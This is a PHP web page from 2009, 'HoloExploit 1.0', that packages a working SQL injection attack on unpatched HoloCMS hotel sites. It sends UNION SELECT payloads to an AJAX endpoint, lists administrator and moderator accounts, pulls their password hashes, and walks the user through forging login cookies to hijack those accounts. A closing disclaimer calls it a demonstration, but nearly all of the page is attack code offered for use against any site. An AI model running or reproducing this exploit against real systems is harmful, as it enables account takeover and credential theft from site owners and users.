
<?php
define('PATH','http://localhost/');
?>
<html><head><title>HoloExploit 1.0</title></head><body>
<h1>HoloExploit 1.0</h1><p>This tool will allow you to gain administrative access to any unpatched HoloCMS installation.</p><hr>
<?php
class HoloExploit {
    var $url;
    var $start;
    var $end;
    function HoloExploit($url){
        $url = str_replace("index.php","",$url);
        $url .= "habblet/ajax_confirmAddFriend.php";
        $this->url = $url;
        $this->getLocations();
        return true;
    }
    function fetchBetween($haystack,$include=false){
        $position = strpos($haystack,$this->start);
        if ($include == false) $position += strlen($this->start);
        $position2 = strpos($haystack,$this->end,$position);
        if ($include == true) $position2 += strlen($this->end);
        $length = $position2 - $position;
        $substring = substr($haystack, $position, $length);
        return trim($substring);
    }
    function getData($sql,$full=false){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT,true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "accountId=".$sql);
        curl_setopt($ch, CURLOPT_AUTOREFERER, true);
        $data = curl_exec($ch);
        if($full){ return $data; }
        curl_close($ch);
        return @$this->fetchBetween($data);
    }
    function isExploitable(){
        $sql = "-1' UNION SELECT 'PWND' AS `name` FROM users WHERE `name` != '";
        $check = $this->getData($sql);
        if(empty($check) || $check != "PWND"){ return false; }else{ return true; }
    }
    function getLocations(){
        $sql = "-1' UNION SELECT 'PWND' AS `name` FROM users WHERE `name` != '";
        $data = $this->getData($sql,true);
        $parts = split("[\n|\r]", $data);
        $line = $parts[2];
        $pos = strpos($line,"PWND");
        $this->start = substr($line,0,$pos);
        $this->end = substr($line,$pos+4);
        return true;
    }
    function getAccounts($rank){
        $i=0;
        $accounts = array();
        while(true){
            $sql = "-1' UNION SELECT `name` FROM users WHERE `rank` = '".$rank."' LIMIT 1 OFFSET ".$i." UNION SELECT `name` FROM users WHERE id = '-1";
            $data = $this->getData($sql);
            if(!empty($data)){
                $accounts[] = $data;
            }else{
                break;
            }
            $i++;
        }
        return $accounts;
    }
    function getPasswordHash($username){
        $sql = "-1' UNION SELECT password AS name FROM users WHERE name = '".$username."' OR password = '";
        return $this->getData($sql);
    }
}

$exploit = new HoloExploit($_POST['url']);
if(isset($_POST['submit']) && $_POST['submit'] == "Hax"){
    $page = 1;
}elseif(isset($_POST['hack'])){
    $page = 2;
}else{
    $page = 0;
}

switch($page){
case 0:
?>
<form method="POST" action="<?php echo PATH; ?>holoexploit.php">
<label for="url">URL of index.php (e.x http://www.retro.com/cms/index.php):</label><br />
<input type="text" name="url" />
<input type="submit" name="submit" value="Hax" />
</form>
<?php
break;
case 1:
$exploit->getLocations();
if($exploit->isExploitable()){
?>
<p>Congratulations! This site is exploitable. Pick the target:<br />
<form method="POST" action="<?php echo PATH; ?>holoexploit.php?do=hack">
<input type="hidden" name="url" value="<?php echo $_POST['url']; ?>" />
<label for="user" /><strong>Administrators:</strong>
<select name="admin">
<?php
$admins = $exploit->getAccounts(7);
foreach($admins as $admin){
?>
<option value="<?php echo $admin; ?>"><?php echo $admin; ?></option>
<?php
}
?>
</select>
<input type="submit" name="hack" value="Admin" />
<br />
<strong>Moderators:</strong>
<select name="moderators">
<?php
$mod = $exploit->getAccounts(6);
foreach($mods as $mod){
?>
<option value="<?php echo $mod; ?>"><?php echo $mod; ?></option>
<?php
}
?>
</select>
<input type="submit" name="hack" value="Mod" />
</form>
<?php
}else{
echo "Sorry, this site isn't exploitable. Please check that the URL is correct and ends with index.php, and that this site is using HoloCMS (duh). If so, then the owner patched the exploit, sorry.";
}
break;
case 2:
if($_POST['hack'] == "Admin"){ $name = $_POST['admin']; }else{ $name = $_POST['moderators']; }
$password = $exploit->getPasswordHash($name);
?>
<strong>Username: </strong><?php echo $name; ?><br />
<strong>Password (Hash or plain-text): </strong><?php echo $password; ?>
<hr>
<?php
preg_match('@^(?:http://)?([^/]+)@i',
    $_POST['url'], $matches);
?>
<p><strong>Create/Edit cookies with "<i><?php echo $matches[1]; ?></i>" as host and the following values:</strong><br />
<ul>
<li><i>remember</i> with the value "remember"</li>
<li><i>rusername</i> with the value "<?php echo $name; ?>"</li>
<li><i>rpassword</i> with the value "<?php echo $password; ?>"</li>
</ul>
<i>Reminder! Be sure to remove the cookie PHPSESSID associated with the target host and make sure you associated the custom cookies WITH the target host.</i><br />If you use Firefox, may I suggest <a href="https://addons.mozilla.org/en-US/firefox/addon/573">AnEC Cookie Editor</a> to do your dirty work?<br />Happy Hacking!</p>
<?php
}
?>
<hr>
<script type="text/javascript"><!--
google_ad_client = "pub-7427255046109210";
/* 468x60, created 5/30/09 */
google_ad_slot = "5690563289";
google_ad_width = 468;
google_ad_height = 60;
//-->

</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script><br />
<i><p>Copyright &copy; 2009 - Yifan Lu<br />This tool is for demonstrating the vulnerability of HoloCMS. It is not intended for any malicious purposes. For a better hotel site, try <a href="http://www.phpretro.com/">PHPRetro</a></p></i>
<hl>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-102544-14");
pageTracker._trackPageview();
} catch(err) {}</script>
</body></html> 
__________________
